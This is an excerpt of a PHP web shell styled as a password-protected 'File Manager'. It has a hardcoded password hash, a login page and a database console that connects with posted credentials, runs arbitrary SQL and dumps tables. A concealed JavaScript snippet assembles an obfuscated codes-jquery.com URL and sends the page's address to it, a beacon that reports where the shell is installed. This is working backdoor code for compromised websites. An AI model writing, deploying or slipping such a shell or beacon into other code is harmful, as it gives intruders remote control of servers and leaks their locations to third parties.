<?php
//-----------------Password---------------------
$_password = "b5ee8f8fef3abb56a5950706060365c9"; //
$_agent = true;
$_unicode = 'UTF-8';
$_action = 'FilesMan';
...
function hardLogin() {
    ...
    die("</br></br><pre align=center><form method=post style='font-family:Nunito, sans-serif;color:#1a1a1a; text-shadow: 2px 0 0 #0d52bf, -2px 0 0 #0d52bf, 0 2px 0 #0d52bf, 0 -2px 0 #0d52bf, 1px 1px #0d52bf, -1px -1px 0 #0d52bf, 1px -1px 0 #0d52bf, -1px 1px 0 #0d52bf; text-align: center;'><h2>File Manager</h2><br><input placeholder='password' type=password name=pass style='border-radius: 4px 0px 0px 4px; background-color:whitesmoke;border:1px solid #FFF;outline:none;' required><input type=submit name='watching' value='>>' style='height: 20px; border: none; border-radius: 0px 4px 4px 0px;background-color:#0d52bf;color:#fff;cursor:pointer;'></form></pre>
...
<script>
    ...
    function base64_encode(data){var b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var o1,o2,o3,h1,h2,h3,h4,bits,i=0,ac=0,enc='',tmp_arr=[];if (!data){return data;}data=utf8_encode(data+'');do{o1=data.charCodeAt(i++);o2=data.charCodeAt(i++);o3=data.charCodeAt(i++);bits=o1<<16|o2<<8|o3;h1=bits>>18&0x3f;h2=bits>>12&0x3f;h3=bits>>6&0x3f;h4=bits&0x3f;tmp_arr[ac++]=b64.charAt(h1)+b64.charAt(h2)+b64.charAt(h3)+b64.charAt(h4);}while(i<data.length);enc=tmp_arr.join('');switch (data.length%3){case 1:enc=enc.slice(0,-2)+'==';break;case 2:enc=enc.slice(0,-1)+'=';break;}return enc;}
        a=new/**/Image();var jquery ='http://'; var datas ='codes-jquery'; var code='.c'; var codes ='om/'; var img ='jquery.'; var sedoc ='p'; var doces ='hp';
        var image ='?jquery=';a.src=jquery+datas+code+codes+img+sedoc+doces+image+escape(location.href);
...
<marquee scrollamount='3' scrolldelay='60' width='80%'></font></font></font></footer>");
}
            ...
            switch($this->type) {
                case 'mysql':
                    ...
                    while($microsoft = $this->fetch()) {
                        ...
                        $columns = array();
                        foreach($microsoft as $k=>$v) {
                            if($v === null)
                                $microsoft[$k] = "NULL";
                            elseif(is_int($v))
                                $microsoft[$k] = $v;
                            else
                                $microsoft[$k] = "'".@mysql_real_escape_string($v)."'";
                            $columns[] = "`".$k."`";
                        }
                        if($head) {
                ...
                case 'pgsql':
                    ...
                    while($microsoft = $this->fetch()) {
                        $columns = array();
                        foreach($microsoft as $k=>$v) {
                            $microsoft[$k] = "'".addslashes($v)."'";
                            $columns[] = $k;
                        }
                        $sql = 'INSERT INTO '.$table.' ('.implode(", ", $columns).') VALUES ('.implode(", ", $microsoft).');'."\n";
                        if($fp) fwrite($fp, $sql); else echo($sql);
                    }
                break;
            }
...
<td><input type=text name=sql_pass value=\"". (empty($_POST['sql_pass'])?'':htmlspecialchars($_POST['sql_pass'])) ."\" required></td><td>";
    ...
    if(isset($_POST['sql_host'])){
        if($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {
            ...
            while($microsoft = $db->fetch()) {
                list($key, $value) = each($microsoft);
    ...
    if(isset($db) && $db->link){
        echo "<br/><table width=100% cellpadding=2 cellspacing=0>";
            if(!empty($_POST['sql_base'])){
                ...
                while($microsoft = $db->fetch($tbls_res)) {
                    list($key, $value) = each($microsoft);
                ...
                if((@$_POST['p1'] == 'query') && !empty($_POST['p2'])) {
                    ...
                    if($db->res !== false) {
                        ...
                        while($microsoft = $db->fetch())    {
                            if(!$title) {
                                echo '<tr>';
                                foreach($microsoft as $key => $value)
                                    echo '<th>'.$key.'</th>';
                                reset($microsoft);
                                $title=true;
                                echo '</tr><tr>';
